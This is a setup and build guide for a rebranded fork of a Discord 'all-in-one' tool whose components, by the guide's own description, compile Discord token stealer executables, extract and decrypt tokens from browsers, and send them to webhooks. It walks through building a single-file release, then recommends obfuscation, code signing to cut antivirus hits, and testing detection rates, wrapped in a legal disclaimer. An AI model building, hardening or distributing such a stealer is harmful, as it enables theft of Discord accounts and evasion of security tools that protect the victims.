# Discord AIO - BITNW MUSIC Edition - Setup Guide

## What Was Changed

This customized version of Discord AIO has been updated with BITNW MUSIC branding and modernized to work with current .NET technologies.

### Logo Customization ✨

All application logos have been replaced with BITNW MUSIC branding:

- **Main Application Icon** (`aionew.png` & `aionew.ico`): Features pink "BITNW" text with gray "MUSIC" text
- **Avatar Images** (`defAvatar.png` & `avatarhover.png`): Updated with BITNW MUSIC branding
- **Window Icon**: Application window now displays BITNW MUSIC logo

### Technical Updates

1. **Project Structure**
   - Added complete `.csproj` files for all projects
   - Created solution file (`.sln`) for easy building
   - Added `.gitignore` for clean repository management

2. **Code Improvements**
   - Updated to .NET 6.0 framework
   - Improved error handling for API connectivity
   - Added timeout configurations for HTTP requests
   - Graceful degradation when backend API is unavailable

3. **Dependencies**
   - Updated all NuGet packages to latest stable versions
   - Microsoft.CodeAnalysis.CSharp v4.8.0
   - Newtonsoft.Json v13.0.3
   - System.Management v8.0.0
   - BouncyCastle v1.8.9

## Quick Start

### System Requirements

- **Operating System**: Windows 10/11 (WPF applications require Windows)
- **.NET 6.0 SDK**: [Download from Microsoft](https://dotnet.microsoft.com/download/dotnet/6.0)
- **Visual Studio 2022** (recommended) or VS Code with C# extension
- **Inter Font**: [Download here](https://rsms.me/inter/download/)

### Building the Application

#### Using Visual Studio 2022 (Recommended)

1. **Open the Solution**
   ```
   Double-click DiscordAIO.sln
   ```

2. **Restore NuGet Packages**
   - Right-click on solution → "Restore NuGet Packages"
   - Or: Build → Restore NuGet Packages

3. **Build the Solution**
   - Press `Ctrl+Shift+B`
   - Or: Build → Build Solution

4. **Run the Application**
   - Press `F5` to run with debugging
   - Or: Press `Ctrl+F5` to run without debugging

#### Using .NET CLI

1. **Restore Dependencies**
   ```bash
   dotnet restore
   ```

2. **Build Release Version**
   ```bash
   dotnet build --configuration Release
   ```

3. **Output Location**
   ```
   bin/Release/net6.0-windows/discord_aio_release.exe
   ```

## Project Components

### Main Application (DiscordAIO.csproj)
- **MainWindow**: Primary application interface
- **UpdaterWindow**: Auto-update functionality
- **HWID**: Hardware identification
- **Metadata**: File metadata generation and cloning

### Compiler (Compiler/daioCompiler.csproj)
- Compiles Discord token stealer executables
- Handles icon embedding
- Metadata injection

### Pentest (Pentest/Pentest.csproj)
- Discord token extraction logic
- Multi-browser support
- Encrypted token decryption

### Updater (Updater/daioUpdater.csproj)
- Automatic application updates
- Version checking
- File replacement logic

## Configuration Notes

### API Endpoints

The application references several API endpoints:

- `https://localhost:7118/user/*` - User management
- `https://localhost:7118/statistics/*` - Statistics tracking
- `http://162.19.227.17/daio/*` - File downloads

**Note**: These endpoints are from the original project and may not be accessible. The application handles their absence gracefully.

### Offline Mode

When API endpoints are unavailable:
- Statistics display "N/A"
- User validation is skipped
- Core functionality remains operational
- No error messages are shown to the user

## Customizing the Logo

To use your own logo:

1. **Create Logo Images**
   - `aionew.png`: 300x300px PNG (main icon)
   - `defAvatar.png`: 200x200px PNG (default avatar)
   - `avatarhover.png`: 200x200px PNG (hover avatar)

2. **Create ICO File**
   ```
   aionew.ico with sizes: 16x16, 32x32, 64x64, 128x128, 256x256
   ```

3. **Replace Files**
   - Place new images in the root directory
   - Rebuild the application

4. **Using Python to Generate** (if needed)
   ```python
   from PIL import Image
   
   # Create PNG
   img = Image.new('RGBA', (300, 300), (255, 255, 255, 255))
   # ... add your graphics ...
   img.save('aionew.png')
   
   # Create ICO
   img.save('aionew.ico', format='ICO', 
            sizes=[(256, 256), (128, 128), (64, 64), (32, 32), (16, 16)])
   ```

## Troubleshooting

### Build Errors

**Error: "The type or namespace name 'X' could not be found"**
- Solution: Restore NuGet packages
- Run: `dotnet restore` or use VS "Restore NuGet Packages"

**Error: "Could not find a part of the path"**
- Solution: Ensure all project files are in correct directories
- Check that .csproj files exist in Compiler/, Pentest/, and Updater/

### Runtime Issues

**Font Rendering Issues**
- Install the Inter font from https://rsms.me/inter/download/
- Restart the application after font installation

**API Connection Errors**
- Expected behavior if original backend is unavailable
- Application will display "N/A" for statistics
- Core functionality is not affected

**HWID Detection Fails**
- Requires Windows with WMI support
- May fail in virtual machines or restricted environments

## Building for Distribution

### Release Build

```bash
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
```

This creates a single executable with all dependencies included.

### Output Location
```
bin/Release/net6.0-windows/win-x64/publish/discord_aio_release.exe
```

### Additional Steps

1. **Code Signing** (Optional but recommended)
   - Sign the executable to reduce antivirus false positives
   - Use a valid code signing certificate

2. **Obfuscation** (Optional)
   - Use tools like ConfuserEx or .NET Reactor
   - Helps protect source code

3. **Testing**
   - Test on clean Windows installation
   - Verify all features work correctly
   - Check antivirus detection rates

## Security Considerations

⚠️ **IMPORTANT LEGAL NOTICE** ⚠️

This tool includes functionality that can:
- Extract Discord tokens from local storage
- Send data to Discord webhooks
- Compile executables with embedded webhooks

**Legal Use Only:**
- Only use on systems you own or have explicit permission to test
- Comply with all applicable laws and regulations
- Respect Discord's Terms of Service
- Understand that misuse may result in criminal prosecution

**Disclaimer:**
The developers and contributors are not responsible for any misuse of this tool. Users are solely responsible for their actions and must ensure compliance with all applicable laws.

## Support and Contribution

### Getting Help

- Review the FAQ in README.md
- Check existing issues on GitHub
- Original project: [Discord-AIO by szajjch](https://github.com/szajjch/Discord-AIO)

### Contributing

This is a customized fork. For the original project:
- Original repository: https://github.com/szajjch/Discord-AIO
- Telegram: https://t.me/+fwzBhvxr1a0zOTU8

## Version Information

- **Base Version**: Discord AIO b1.1.1
- **Customization**: BITNW MUSIC Edition
- **Framework**: .NET 6.0
- **Date**: November 2025

## File Checklist

Ensure these files exist before building:

```
✓ DiscordAIO.sln
✓ DiscordAIO.csproj
✓ App.xaml / App.xaml.cs
✓ MainWindow.xaml / MainWindow.xaml.cs
✓ UpdaterWindow.xaml / UpdaterWindow.xaml.cs
✓ hwid.cs
✓ Metadata.cs
✓ aionew.png
✓ aionew.ico
✓ defAvatar.png
✓ avatarhover.png
✓ Compiler/daioCompiler.csproj
✓ Compiler/daioCompiler.cs
✓ Compiler/Program.cs
✓ Pentest/Pentest.csproj
✓ Pentest/Program.cs
✓ Updater/daioUpdater.csproj
✓ Updater/Form1.cs
✓ Updater/Program.cs
```

## Next Steps

1. ✅ Install .NET 6.0 SDK
2. ✅ Install Inter font
3. ✅ Open DiscordAIO.sln in Visual Studio
4. ✅ Restore NuGet packages
5. ✅ Build the solution
6. ✅ Run and test the application
7. ✅ (Optional) Customize further as needed

---

**Happy Coding! 🎉**

For questions about BITNW MUSIC customization, refer to the commit history and modification logs.
